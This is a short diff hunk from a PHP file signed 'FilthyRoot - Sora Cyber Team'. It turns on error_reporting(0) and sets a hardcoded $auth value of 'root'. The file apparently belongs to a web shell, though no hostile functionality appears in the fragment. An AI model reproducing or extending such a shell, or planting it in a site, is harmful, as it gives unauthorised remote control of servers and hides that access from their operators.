@@ -4,7 +4,7 @@
  28 June 2019
  Coded by FilthyRoot - Sora Cyber Team
 */
- #error_reporting(0);
+ error_reporting(0);
  session_start();
  $auth="root";
  function serverip(){
